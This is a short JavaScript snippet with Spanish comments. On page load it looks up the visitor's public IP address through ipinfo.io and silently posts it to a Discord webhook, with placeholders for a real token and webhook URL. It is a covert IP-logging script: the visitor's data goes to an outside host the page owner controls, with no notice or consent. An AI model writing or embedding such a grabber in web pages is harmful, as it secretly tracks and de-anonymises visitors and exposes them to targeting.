async function obtenerIP() {
  const apiKey = 'TU_TOKEN_DE_IPINFO'; // Reemplaza con tu API Key real
  const response = await fetch(`https://ipinfo.io/ip?token=${apiKey}`);
  const ip = await response.text();
  return ip.trim();
}

async function enviarIPaDiscord(ip) {
  const webhookURL = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN'; // Reemplaza con tu webhook
  await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ content: `📡 IP registrada: ${ip}` })
  });
}

window.addEventListener("DOMContentLoaded", async () => {
  const ip = await obtenerIP();
  await enviarIPaDiscord(ip);
});
